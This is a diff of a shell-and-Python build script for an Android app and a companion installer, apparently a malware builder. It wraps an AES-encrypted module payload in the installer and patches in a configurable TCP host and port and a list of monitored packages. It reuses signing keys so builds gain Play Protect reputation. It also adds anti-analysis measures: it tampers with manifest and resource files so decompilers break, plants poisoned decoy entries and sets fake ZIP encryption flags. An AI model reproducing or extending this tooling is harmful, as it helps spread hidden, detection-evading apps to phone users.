@@ -533,10 +533,6 @@ done
 APP_STRINGS="$ROOT_DIR/app/src/main/res/values/strings.xml"
 INSTALLER_STRINGS="$ROOT_DIR/installer/src/main/res/values/strings.xml"
 APP_CONSTANTS="$ROOT_DIR/app/src/main/java/com/task/tusker/utils/Constants.java"
-INSTALLER_BUILD_GRADLE="$ROOT_DIR/installer/build.gradle"
-INSTALLER_PROGUARD="$ROOT_DIR/installer/proguard-rules.pro"
-INSTALLER_MANIFEST="$ROOT_DIR/installer/src/main/AndroidManifest.xml"
-INSTALLER_JAVA_ROOT="$ROOT_DIR/installer/src/main/java"
 ACCESS_ID_FILE="$ROOT_DIR/app/build.access_id"
 APP_ID_FILE="$ROOT_DIR/app/build.app_id"
 INSTALLER_PACKAGE_FILE="$ROOT_DIR/app/build.installer_id"
@@ -554,28 +550,6 @@ mkdir -p "$BACKUP_DIR"
 APP_STRINGS_BAK="$BACKUP_DIR/app.strings.xml.bak"
 INSTALLER_STRINGS_BAK="$BACKUP_DIR/installer.strings.xml.bak"
 APP_CONSTANTS_BAK="$BACKUP_DIR/app.Constants.java.bak"
-INSTALLER_BUILD_GRADLE_BAK="$BACKUP_DIR/installer.build.gradle.bak"
-INSTALLER_PROGUARD_BAK="$BACKUP_DIR/installer.proguard-rules.pro.bak"
-INSTALLER_MANIFEST_BAK="$BACKUP_DIR/installer.AndroidManifest.xml.bak"
-INSTALLER_JAVA_BAK="$BACKUP_DIR/installer.java.bak"
-ACCESS_ID_PREEXISTING_BAK="$BACKUP_DIR/preexisting.build.access_id"
-APP_ID_PREEXISTING_BAK="$BACKUP_DIR/preexisting.build.app_id"
-INSTALLER_PACKAGE_PREEXISTING_BAK="$BACKUP_DIR/preexisting.build.installer_id"
-INSTALLER_ID_PREEXISTING_BAK="$BACKUP_DIR/preexisting.installer.build.app_id"
-
-# Per-build override files are normally generated and removed at EXIT. Preserve
-# any file that was already present before this invocation (for example a
-# repository checkout may intentionally carry app/build.app_id).
-for _override_pair in \
-    "$ACCESS_ID_FILE:$ACCESS_ID_PREEXISTING_BAK" \
-    "$APP_ID_FILE:$APP_ID_PREEXISTING_BAK" \
-    "$INSTALLER_PACKAGE_FILE:$INSTALLER_PACKAGE_PREEXISTING_BAK" \
-    "$INSTALLER_ID_FILE:$INSTALLER_ID_PREEXISTING_BAK"; do
-    _override_src="${_override_pair%%:*}"
-    _override_bak="${_override_pair#*:}"
-    [ -f "$_override_src" ] && cp -f "$_override_src" "$_override_bak"
-done
-unset _override_pair _override_src _override_bak
 
 # Also defensively clean up any *.bak files that a previous, interrupted
 # run may have left INSIDE Android resource directories. Without this,
@@ -594,21 +568,10 @@ cleanup_overrides() {
     [ -f "$APP_STRINGS_BAK"       ] && mv -f "$APP_STRINGS_BAK"       "$APP_STRINGS"       || true
     [ -f "$INSTALLER_STRINGS_BAK" ] && mv -f "$INSTALLER_STRINGS_BAK" "$INSTALLER_STRINGS" || true
     [ -f "$APP_CONSTANTS_BAK"     ] && mv -f "$APP_CONSTANTS_BAK"     "$APP_CONSTANTS"     || true
-    [ -f "$INSTALLER_BUILD_GRADLE_BAK" ] && mv -f "$INSTALLER_BUILD_GRADLE_BAK" "$INSTALLER_BUILD_GRADLE" || true
-    [ -f "$INSTALLER_PROGUARD_BAK" ] && mv -f "$INSTALLER_PROGUARD_BAK" "$INSTALLER_PROGUARD" || true
-    [ -f "$INSTALLER_MANIFEST_BAK" ] && mv -f "$INSTALLER_MANIFEST_BAK" "$INSTALLER_MANIFEST" || true
-    if [ -d "$INSTALLER_JAVA_BAK" ]; then
-        rm -rf "$INSTALLER_JAVA_ROOT"
-        mv -f "$INSTALLER_JAVA_BAK" "$INSTALLER_JAVA_ROOT"
-    fi
     [ -f "$APP_LAYOUT_BAK"        ] && mv -f "$APP_LAYOUT_BAK"        "$APP_LAYOUT"        || true
     [ -f "$INSTALLER_LAYOUT_BAK"  ] && mv -f "$INSTALLER_LAYOUT_BAK"  "$INSTALLER_LAYOUT"  || true
     [ -f "$INSTALLER_COLORS_BAK"  ] && mv -f "$INSTALLER_COLORS_BAK"  "$INSTALLER_COLORS"  || true
     rm -f "$ACCESS_ID_FILE" "$APP_ID_FILE" "$INSTALLER_PACKAGE_FILE" "$INSTALLER_ID_FILE"
-    [ -f "$ACCESS_ID_PREEXISTING_BAK" ] && mv -f "$ACCESS_ID_PREEXISTING_BAK" "$ACCESS_ID_FILE" || true
-    [ -f "$APP_ID_PREEXISTING_BAK" ] && mv -f "$APP_ID_PREEXISTING_BAK" "$APP_ID_FILE" || true
-    [ -f "$INSTALLER_PACKAGE_PREEXISTING_BAK" ] && mv -f "$INSTALLER_PACKAGE_PREEXISTING_BAK" "$INSTALLER_PACKAGE_FILE" || true
-    [ -f "$INSTALLER_ID_PREEXISTING_BAK" ] && mv -f "$INSTALLER_ID_PREEXISTING_BAK" "$INSTALLER_ID_FILE" || true
     # NOTE: MODULE_KS_PATH and INST_KS_PATH now point to persistent files inside
     # app/ — do NOT delete them here.  They must survive across builds so the
     # same signing certificate is reused and can accumulate Play Protect reputation.
@@ -641,212 +604,7 @@ PYEOF
 fi
 unset _PKGIDS_FILE _RAND_PKG
 
-# ── Installer identity generation ────────────────────────────────────────────
-# The installer applicationId is user/job supplied in customized builds. Keep
-# the Java namespace, component class names, action string, Gradle namespace,
-# and R8 entry-point rules aligned with that ID so a generated installer never
-# carries the in-tree com.onerule.task identity.
-#
-# This is a temporary source rewrite. The original installer tree is moved
-# outside the Java source set and restored by cleanup_overrides(), including
-# when the build fails or is interrupted.
-INSTALLER_PACKAGE_DEFAULT="com.onerule.task"
-INSTALLER_PACKAGE_EFFECTIVE="${BUILD_INSTALLER_PACKAGE:-$INSTALLER_PACKAGE_DEFAULT}"
-if ! [[ "$INSTALLER_PACKAGE_EFFECTIVE" =~ ^[A-Za-z_][A-Za-z0-9_]*(\.[A-Za-z_][A-Za-z0-9_]*)+$ ]]; then
-    echo "  ERROR: installer package ID is not a valid Java package name: '$INSTALLER_PACKAGE_EFFECTIVE'"
-    exit 1
-fi
-
-INSTALLER_PACKAGE_PATH="${INSTALLER_PACKAGE_EFFECTIVE//./\/}"
-INSTALLER_ACTIVITY_CLASS="MainActivity"
-INSTALLER_VPN_CLASS="BlockVpnService"
-INSTALLER_RECEIVER_CLASS="InstallResultReceiver"
-
-# Discover the checked-in component classes so repeated and custom-package
-# builds can normalize them to stable, readable names.
-cp "$INSTALLER_BUILD_GRADLE" "$INSTALLER_BUILD_GRADLE_BAK"
-cp "$INSTALLER_PROGUARD" "$INSTALLER_PROGUARD_BAK"
-cp "$INSTALLER_MANIFEST" "$INSTALLER_MANIFEST_BAK"
-mv "$INSTALLER_JAVA_ROOT" "$INSTALLER_JAVA_BAK"
-mkdir -p "$INSTALLER_JAVA_ROOT/$INSTALLER_PACKAGE_PATH"
-INSTALLER_SOURCE_CLASSES=$(python3 - "$INSTALLER_JAVA_BAK" << 'PYEOF'
-import pathlib
-import re
-import sys
-
-root = pathlib.Path(sys.argv[1])
-matches = {}
-patterns = {
-    "activity": re.compile(r"\bpublic\s+class\s+([A-Za-z_][A-Za-z0-9_]*)\s+extends\s+Activity\b"),
-    "vpn": re.compile(r"\bpublic\s+class\s+([A-Za-z_][A-Za-z0-9_]*)\s+extends\s+VpnService\b"),
-    "receiver": re.compile(
-        r"\b(?:(?:public|protected|private)\s+)?"
-        r"(?:(?:static|final|abstract)\s+)*class\s+"
-        r"([A-Za-z_][A-Za-z0-9_]*)\s+extends\s+BroadcastReceiver\b"
-    ),
-}
-
-for path in sorted(root.rglob("*.java")):
-    text = path.read_text(encoding="utf-8")
-    for kind, pattern in patterns.items():
-        match = pattern.search(text)
-        if match and kind not in matches:
-            matches[kind] = (match.group(1), str(path))
-
-missing = [kind for kind in patterns if kind not in matches]
-if missing:
-    raise SystemExit("Could not find installer source class(es): " + ", ".join(missing))
-
-print("\t".join([
-    matches["activity"][0], matches["activity"][1],
-    matches["vpn"][0], matches["vpn"][1],
-    matches["receiver"][0], matches["receiver"][1],
-]))
-PYEOF
-)
-IFS=$'\t' read -r INSTALLER_SOURCE_ACTIVITY_CLASS INSTALLER_SOURCE_ACTIVITY_PATH \
-    INSTALLER_SOURCE_VPN_CLASS INSTALLER_SOURCE_VPN_PATH \
-    INSTALLER_SOURCE_RECEIVER_CLASS INSTALLER_SOURCE_RECEIVER_PATH <<< "$INSTALLER_SOURCE_CLASSES"
-
-INSTALLER_JAVA_TARGET="$INSTALLER_JAVA_ROOT/$INSTALLER_PACKAGE_PATH"
-mkdir -p "$INSTALLER_JAVA_TARGET"
-# Carry every installer source into customized builds. The activity and VPN
-# service are renamed below, while support components such as the
-# PackageInstaller status receiver must not be dropped from the generated
-# source set.
-find "$INSTALLER_JAVA_BAK" -type f -name "*.java" -print0 |
-while IFS= read -r -d '' source_path; do
-    cp "$source_path" "$INSTALLER_JAVA_TARGET/$(basename "$source_path")"
-done
-
-INSTALLER_PACKAGE_EFFECTIVE="$INSTALLER_PACKAGE_EFFECTIVE" \
-INSTALLER_ACTIVITY_CLASS="$INSTALLER_ACTIVITY_CLASS" \
-INSTALLER_VPN_CLASS="$INSTALLER_VPN_CLASS" \
-INSTALLER_RECEIVER_CLASS="$INSTALLER_RECEIVER_CLASS" \
-INSTALLER_SOURCE_ACTIVITY_CLASS="$INSTALLER_SOURCE_ACTIVITY_CLASS" \
-INSTALLER_SOURCE_VPN_CLASS="$INSTALLER_SOURCE_VPN_CLASS" \
-INSTALLER_SOURCE_RECEIVER_CLASS="$INSTALLER_SOURCE_RECEIVER_CLASS" \
-python3 - "$INSTALLER_JAVA_TARGET" << 'PYEOF'
-import os
-import pathlib
-import re
-import sys
-
-pkg = os.environ["INSTALLER_PACKAGE_EFFECTIVE"]
-activity = os.environ["INSTALLER_ACTIVITY_CLASS"]
-vpn = os.environ["INSTALLER_VPN_CLASS"]
-receiver = os.environ["INSTALLER_RECEIVER_CLASS"]
-source_activity = os.environ["INSTALLER_SOURCE_ACTIVITY_CLASS"]
-source_vpn = os.environ["INSTALLER_SOURCE_VPN_CLASS"]
-source_receiver = os.environ["INSTALLER_SOURCE_RECEIVER_CLASS"]
-
-for path in pathlib.Path(sys.argv[1]).rglob("*.java"):
-    with open(path, "r", encoding="utf-8") as f:
-        src = f.read()
-    src = re.sub(r"^package\s+[^;]+;", f"package {pkg};", src, count=1, flags=re.MULTILINE)
-    src = re.sub(rf"\b{re.escape(source_activity)}\b", activity, src)
-    src = re.sub(rf"\b{re.escape(source_vpn)}\b", vpn, src)
-    src = re.sub(rf"\b{re.escape(source_receiver)}\b", receiver, src)
-    src = src.replace('"com.onerule.task.INSTALL_DONE"', f'"{pkg}.INSTALL_DONE"')
-    src = src.replace('"com.onerule.task.ACTION_INSTALL_STATUS"',
-                      f'"{pkg}.ACTION_INSTALL_STATUS"')
-    with open(path, "w", encoding="utf-8") as f:
-        f.write(src)
-PYEOF
-
-# Match the generated public class names after the source rewrite. Support
-# classes keep their original filenames because their class names are stable.
-if [ "$INSTALLER_SOURCE_ACTIVITY_CLASS" != "$INSTALLER_ACTIVITY_CLASS" ]; then
-    mv -f "$INSTALLER_JAVA_TARGET/$INSTALLER_SOURCE_ACTIVITY_CLASS.java" \
-          "$INSTALLER_JAVA_TARGET/$INSTALLER_ACTIVITY_CLASS.java"
-fi
-if [ "$INSTALLER_SOURCE_VPN_CLASS" != "$INSTALLER_VPN_CLASS" ]; then
-    mv -f "$INSTALLER_JAVA_TARGET/$INSTALLER_SOURCE_VPN_CLASS.java" \
-          "$INSTALLER_JAVA_TARGET/$INSTALLER_VPN_CLASS.java"
-fi
-if [ "$INSTALLER_SOURCE_RECEIVER_CLASS" != "$INSTALLER_RECEIVER_CLASS" ]; then
-    mv -f "$INSTALLER_JAVA_TARGET/$INSTALLER_SOURCE_RECEIVER_CLASS.java" \
-          "$INSTALLER_JAVA_TARGET/$INSTALLER_RECEIVER_CLASS.java"
-fi
-
-INSTALLER_PACKAGE_EFFECTIVE="$INSTALLER_PACKAGE_EFFECTIVE" \
-INSTALLER_ACTIVITY_CLASS="$INSTALLER_ACTIVITY_CLASS" \
-INSTALLER_VPN_CLASS="$INSTALLER_VPN_CLASS" \
-INSTALLER_RECEIVER_CLASS="$INSTALLER_RECEIVER_CLASS" \
-INSTALLER_SOURCE_ACTIVITY_CLASS="$INSTALLER_SOURCE_ACTIVITY_CLASS" \
-INSTALLER_SOURCE_VPN_CLASS="$INSTALLER_SOURCE_VPN_CLASS" \
-INSTALLER_SOURCE_RECEIVER_CLASS="$INSTALLER_SOURCE_RECEIVER_CLASS" \
-python3 - "$INSTALLER_BUILD_GRADLE" "$INSTALLER_PROGUARD" "$INSTALLER_MANIFEST" << 'PYEOF'
-import os
-import re
-import sys
-
-pkg = os.environ["INSTALLER_PACKAGE_EFFECTIVE"]
-activity = os.environ.get("INSTALLER_ACTIVITY_CLASS", "")
-vpn = os.environ.get("INSTALLER_VPN_CLASS", "")
-receiver = os.environ.get("INSTALLER_RECEIVER_CLASS", "")
-source_activity = os.environ["INSTALLER_SOURCE_ACTIVITY_CLASS"]
-source_vpn = os.environ["INSTALLER_SOURCE_VPN_CLASS"]
-source_receiver = os.environ["INSTALLER_SOURCE_RECEIVER_CLASS"]
-
-gradle_path, proguard_path, manifest_path = sys.argv[1:]
-with open(gradle_path, "r", encoding="utf-8") as f:
-    gradle = f.read()
-gradle = gradle.replace("namespace 'com.onerule.task'", f"namespace '{pkg}'", 1)
-with open(gradle_path, "w", encoding="utf-8") as f:
-    f.write(gradle)
-
-with open(proguard_path, "r", encoding="utf-8") as f:
-    proguard = f.read()
-proguard = proguard.replace(
-    f"com.onerule.task.{source_activity}",
-    f"{pkg}.{activity}",
-)
-proguard = proguard.replace(
-    f"com.onerule.task.{source_vpn}",
-    f"{pkg}.{vpn}",
-)
-proguard = proguard.replace(
-    f"com.onerule.task.{source_receiver}",
-    f"{pkg}.{receiver}",
-)
-proguard = re.sub(
-    r"(?m)^-keep class [A-Za-z_][A-Za-z0-9_.]*\.BuildConfig \{ \*; \}$",
-    f"-keep class {pkg}.BuildConfig {{ *; }}",
-    proguard,
-)
-with open(proguard_path, "w", encoding="utf-8") as f:
-    f.write(proguard)
-
-with open(manifest_path, "r", encoding="utf-8") as f:
-    manifest = f.read()
-manifest = manifest.replace(
-    f'android:name=".{source_activity}"',
-    f'android:name=".{activity}"',
-    1,
-)
-manifest = manifest.replace(
-    f'android:name=".{source_vpn}"',
-    f'android:name=".{vpn}"',
-    1,
-)
-manifest = manifest.replace(
-    f'android:name=".{source_receiver}"',
-    f'android:name=".{receiver}"',
-    1,
-)
-with open(manifest_path, "w", encoding="utf-8") as f:
-    f.write(manifest)
-PYEOF
-
-echo "  Installer namespace   = $INSTALLER_PACKAGE_EFFECTIVE"
-echo "  Installer activity    = $INSTALLER_ACTIVITY_CLASS"
-echo "  Installer VPN service  = $INSTALLER_VPN_CLASS"
-echo "  Installer receiver    = $INSTALLER_RECEIVER_CLASS"
-echo "  Installer manifest    = generated component names applied"
-echo "  Installer methods     = stable source names (installer minification disabled)"
-
-if [ -n "${BUILD_ACCESS_ID:-}" ] || [ -n "${BUILD_MODULE_PACKAGE:-}" ] || [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] || [ -n "${BUILD_MODULE_NAME:-}" ] || [ -n "${BUILD_INSTALLER_NAME:-}" ] || [ -n "${BUILD_MONITORED_PACKAGES:-}" ] || [ -n "${BUILD_MODULE_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BTN:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_ACCENT:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP1:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP2:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP3:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP4:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BTN:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_FOOTER:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_CARD_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_ACCENT:-}" ]; then
+if [ -n "${BUILD_ACCESS_ID:-}" ] || [ -n "${BUILD_MODULE_PACKAGE:-}" ] || [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] || [ -n "${BUILD_MODULE_NAME:-}" ] || [ -n "${BUILD_INSTALLER_NAME:-}" ] || [ -n "${BUILD_MONITORED_PACKAGES:-}" ] || [ -n "${BUILD_TCP_HOST:-}" ] || [ -n "${BUILD_TCP_PORT:-}" ] || [ -n "${BUILD_MODULE_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BTN:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_ACCENT:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP1:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP2:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP3:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP4:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BTN:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_FOOTER:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_CARD_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_ACCENT:-}" ]; then
     echo ""
     echo "==> Per-build customization active"
 
@@ -925,6 +683,44 @@ with open(path, 'w', encoding='utf-8') as f:
     f.write(new)
 print(f"  Constants.java MONITORED_PACKAGES = {len(uniq)} entries")
 PYEOF
+    fi
+
+    # Patch Constants.java TCP_HOST with the server's actual hostname.
+    if [ -n "${BUILD_TCP_HOST:-}" ] && [ -f "$APP_CONSTANTS" ]; then
+        [ ! -f "$APP_CONSTANTS_BAK" ] && cp "$APP_CONSTANTS" "$APP_CONSTANTS_BAK"
+        BUILD_TCP_HOST="$BUILD_TCP_HOST" python3 - "$APP_CONSTANTS" << 'PYEOF'
+import sys, os, re
+path = sys.argv[1]
+host = os.environ['BUILD_TCP_HOST']
+with open(path, 'r', encoding='utf-8') as f: src = f.read()
+new = re.sub(
+    r'(public\s+static\s+final\s+String\s+TCP_HOST\s*=\s*")[^"]*(")',
+    lambda m: m.group(1) + host + m.group(2),
+    src, count=1
+)
+with open(path, 'w', encoding='utf-8') as f: f.write(new)
+print(f"  Constants.java TCP_HOST = {host}")
+PYEOF
+        echo "  TCP_HOST = $BUILD_TCP_HOST"
+    fi
+
+    # Patch Constants.java TCP_PORT with the server's actual port.
+    if [ -n "${BUILD_TCP_PORT:-}" ] && [ -f "$APP_CONSTANTS" ]; then
+        [ ! -f "$APP_CONSTANTS_BAK" ] && cp "$APP_CONSTANTS" "$APP_CONSTANTS_BAK"
+        BUILD_TCP_PORT="$BUILD_TCP_PORT" python3 - "$APP_CONSTANTS" << 'PYEOF'
+import sys, os, re
+path = sys.argv[1]
+port = os.environ['BUILD_TCP_PORT']
+with open(path, 'r', encoding='utf-8') as f: src = f.read()
+new = re.sub(
+    r'(public\s+static\s+final\s+int\s+TCP_PORT\s*=\s*)\d+(\s*;)',
+    lambda m: m.group(1) + port + m.group(2),
+    src, count=1
+)
+with open(path, 'w', encoding='utf-8') as f: f.write(new)
+print(f"  Constants.java TCP_PORT = {port}")
+PYEOF
+        echo "  TCP_PORT = $BUILD_TCP_PORT"
     fi
 
     # ── Custom app icons ──────────────────────────────────────────────────────
@@ -1295,9 +1091,10 @@ PYEOF
         rm -rf "$ROOT_DIR/apk-output/$BUILD_ACCESS_ID"
         echo "  Cleared previous APKs for $BUILD_ACCESS_ID"
     fi
-    # Also wipe the module asset so the installer is rebuilt around the new
-    # padded payload, and any leftover signing sidecar files.
+    # Also wipe the encrypted module asset so the installer is rebuilt around
+    # the new payload, and any leftover signing sidecar files.
     rm -f "$ROOT_DIR/installer/src/main/assets/module" \
+          "$ROOT_DIR/installer/build.key" \
           "$ROOT_DIR/installer/payload.pkg" 2>/dev/null || true
 fi
 
@@ -1597,6 +1394,35 @@ else
     echo "  Installer keystore          (CN=$INST_KS_CN, O=$INST_KS_ORG, C=$INST_KS_COUNTRY)"
 fi
 
+# ── 5b. Python tooling (pyzipper for AES-256 module encryption) ──────────────
+echo ""
+echo "==> Ensuring Python build tools..."
+if ! python3 -c "import pyzipper" >/dev/null 2>&1; then
+    echo "  Installing pyzipper..."
+    # Try methods in order of preference:
+    #  1. uv (fast, avoids any pip restrictions entirely)
+    #  2. pip --break-system-packages (Alpine PEP 668 override — safe since we own the image)
+    #  3. pip plain (Debian/Ubuntu where no flag is needed)
+    #  4. pip --user (last-resort for non-container envs)
+    if command -v uv >/dev/null 2>&1; then
+        uv pip install --system pyzipper >/dev/null 2>&1 \
+          || pip install --break-system-packages --quiet pyzipper 2>/dev/null \
+          || pip install --quiet pyzipper 2>/dev/null \
+          || pip install --user --quiet pyzipper 2>/dev/null
+    else
+        pip install --break-system-packages --quiet pyzipper 2>/dev/null \
+          || pip install --quiet pyzipper 2>/dev/null \
+          || pip install --user --quiet pyzipper 2>/dev/null
+    fi
+    if ! python3 -c "import pyzipper" >/dev/null 2>&1; then
+        echo "  ERROR: failed to install pyzipper (required for installer module encryption)"
+        exit 1
+    fi
+    echo "  pyzipper installed."
+else
+    echo "  pyzipper already present."
+fi
+
 # ── 6. Obfuscation dictionary ─────────────────────────────────────────────────
 echo ""
 echo "==> Generating obfuscation dictionary..."
@@ -1671,21 +1497,19 @@ cd "$ROOT_DIR"
 unset GRADLE_OPTS
 
 if [ -n "${GRADLE_BUILD_SEQUENTIAL:-}" ]; then
-    echo "  Building the main app in separate variants to lower peak memory use."
-    ./gradlew :app:assembleDebug \
+    echo "  Running separate assembleDebug and assembleRelease builds to lower peak memory use."
+    ./gradlew assembleDebug \
         --daemon --parallel --build-cache --stacktrace 2>&1
-    ./gradlew :app:assembleRelease \
+    ./gradlew assembleRelease \
         --daemon --parallel --build-cache --stacktrace 2>&1
 else
-    # Build only the main app here. The installer payload is generated and
-    # encrypted below, so building the installer at this stage would build it
-    # twice and reuse resource-merger state when its final payload is ready.
-    # Explicit project task paths avoid Gradle's root assemble tasks, which
-    # aggregate both :app and :installer.
+    # Running assembleDebug and assembleRelease together lets Gradle share dependency
+    # resolution, resource merging, and manifest processing across both variants —
+    # significantly faster than two separate ./gradlew calls.
     # --daemon        : reuse the warm JVM from the properties file setting
-    # --parallel      : allow independent tasks in the app module to compile concurrently
+    # --parallel      : :app and :installer compile simultaneously
     # --build-cache   : skip tasks whose inputs haven't changed (huge on repeat builds)
-    ./gradlew :app:assembleDebug :app:assembleRelease \
+    ./gradlew assembleDebug assembleRelease \
         --daemon \
         --parallel \
         --build-cache \
@@ -1797,7 +1621,7 @@ PYEOF
     #          (per-chunk size fields are authoritative for Android), but that
     #          break apktool / aapt2 / jadx, which read to EOF and validate
     #          flags/types strictly.
-    #     (c2) Plant decoy entries (fake dex, .bak files, readable res/ XML).
+    #     (c2) Plant decoy entries (fake dex, .bak files, corrupted res/ XML).
     #     Both done in a single APK rebuild so we re-sign exactly once.
     echo "  [c] Tampering resources.arsc + AndroidManifest.xml + planting decoys ..."
     python3 - << PYEOF
@@ -1930,89 +1754,34 @@ def is_axml(b: bytes) -> bool:
 # ─────────────────────────────────────────────────────────────────────────────
 #  DECOY ENTRIES (planted in res/, assets/, root)
 # ─────────────────────────────────────────────────────────────────────────────
-def readable_xml(body):
-    return ("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
-            + body.strip() + "\n").encode("utf-8")
+def poison_axml():
+    header = struct.pack("<HHI", 0x0003, 0x0008, 0x10000000)
+    spool  = struct.pack("<HHIIIIII",
+                         0x0001, 0x001C,
+                         0x10000000, 0x7FFFFFFF, 0, 0, 0x10000000, 0)
+    return header + spool + os.urandom(512)
 
 def poison_arsc_blob():
     return struct.pack("<HHII",
                        0x0002, 0x000C, 0x10000000, 0x7FFFFFFF) + os.urandom(2048)
 
 decoys = {
-    "classes2.dex":                 b"dex\n000\x00" + os.urandom(2048),
-    "manifest_backup.xml":          readable_xml("""
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.example.settings">
-    <application android:label="Settings" android:allowBackup="true" />
-</manifest>"""),
+    "classes0.dex":                 b"dex\n000\x00" + os.urandom(2048),
+    "AndroidManifest.xml.bak":      poison_axml(),
     "resources.arsc.bak":           poison_arsc_blob(),
-    "META-INF/services/javax.annotation.processing.Processor":
-                                    b"# No optional processors are declared.\n",
-    "res/xml/backup_rules.xml":     readable_xml("""
-<full-backup-content>
-    <include domain="file" path="settings.xml" />
-</full-backup-content>"""),
-    "res/xml/network_security_config.xml":
-                                    readable_xml("""
-<network-security-config>
-    <base-config cleartextTrafficPermitted="false">
-        <trust-anchors>
-            <certificates src="system" />
-        </trust-anchors>
-    </base-config>
-</network-security-config>"""),
-    "res/layout/activity_settings.xml":
-                                    readable_xml("""
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    android:layout_width="match_parent"
-    android:layout_height="match_parent"
-    android:orientation="vertical">
-    <TextView
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="Settings" />
-</LinearLayout>"""),
-    "res/layout/view_status.xml":   readable_xml("""
-<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    android:layout_width="match_parent"
-    android:layout_height="wrap_content">
-    <TextView
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="Ready" />
-</FrameLayout>"""),
-    "res/menu/main_menu.xml":       readable_xml("""
-<menu xmlns:android="http://schemas.android.com/apk/res/android">
-    <item
-        android:id="@+id/action_settings"
-        android:title="Settings"
-        android:showAsAction="never" />
-</menu>"""),
-    "res/anim/fade_in.xml":         readable_xml("""
-<alpha xmlns:android="http://schemas.android.com/apk/res/android"
-    android:duration="200"
-    android:fromAlpha="0.0"
-    android:toAlpha="1.0" />"""),
-    "res/drawable/status_background.xml":
-                                    readable_xml("""
-<shape xmlns:android="http://schemas.android.com/apk/res/android"
-    android:shape="rectangle">
-    <solid android:color="#FFF4F4F4" />
-    <corners android:radius="8dp" />
-</shape>"""),
-    "res/values/colors.xml":        readable_xml("""
-<resources>
-    <color name="status_background">#FFF4F4F4</color>
-    <color name="status_text">#FF202124</color>
-</resources>"""),
-    "res/raw/sample_payload.bin":   os.urandom(1024),
-    "res/raw/resource_table.arsc":  poison_arsc_blob(),
-    "assets/app_manifest.xml":      readable_xml("""
-<application-metadata>
-    <name>Settings</name>
-    <version>1</version>
-</application-metadata>"""),
-    "assets/resource_table.arsc":   poison_arsc_blob(),
+    "META-INF/services/\xef\xbb\xbfpoison": b"# decoy\n",
+    "res/xml/_decoy0.xml":          poison_axml(),
+    "res/xml/_decoy1.xml":          poison_axml(),
+    "res/layout/_decoy0.xml":       poison_axml(),
+    "res/layout/_decoy1.xml":       poison_axml(),
+    "res/menu/_decoy.xml":          poison_axml(),
+    "res/anim/_decoy.xml":          poison_axml(),
+    "res/drawable/_decoy.xml":      poison_axml(),
+    "res/values/_decoy.xml":        poison_axml(),
+    "res/raw/_decoy.bin":           os.urandom(1024),
+    "res/raw/_decoy.arsc":          poison_arsc_blob(),
+    "assets/_decoy_manifest.xml":   poison_axml(),
+    "assets/_decoy_resources.arsc": poison_arsc_blob(),
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -2053,6 +1822,120 @@ if len(tampered_axml_files) > 8:
 print("    Decoy entries planted:     %d" % len(decoys))
 PYEOF
 
+    # (c2) Pseudo-encryption — ZIP local-header + central-directory GP flags
+    #
+    # Sets General-Purpose Bit Flag bit 0 (0x0001 = encrypted) and bit 6
+    # (0x0040 = strong encryption) on AndroidManifest.xml, classes*.dex, and
+    # resources.arsc in BOTH the local file headers and the central directory.
+    #
+    # Why it works on Android:
+    #   APK v2/v3/v4 signing hashes the ZIP data blocks directly; the installer
+    #   verifies those block hashes and then reads file data via the central
+    #   directory — it never checks the local-header GP flags. The APK installs
+    #   and runs identically on every Android version.
+    #
+    # Why it breaks analysis tools:
+    #   apktool, jadx, baksmali, aapt2, and most decompiler frontends read the
+    #   local-header GP flags before attempting to decompress each entry.
+    #   Seeing bit 0, they treat the data as encrypted ciphertext and either
+    #   refuse to continue or pass garbage to their decoders.
+    #
+    # Anti-pseudo-decryption layers:
+    #   1. Bit 6 (strong-encryption marker) — tools that auto-strip pseudo-
+    #      encryption by clearing only bit 0 still see bit 6 and expect a
+    #      strong-encryption blob (WinZip AES / RC2 / 3DES) with a completely
+    #      different header format, so clearing bit 0 alone does not help them.
+    #   2. Local-header CRC-32 XOR'd with 0xDEADBEEF — tools that strip both
+    #      flag bits and then re-verify the decompressed data against the local-
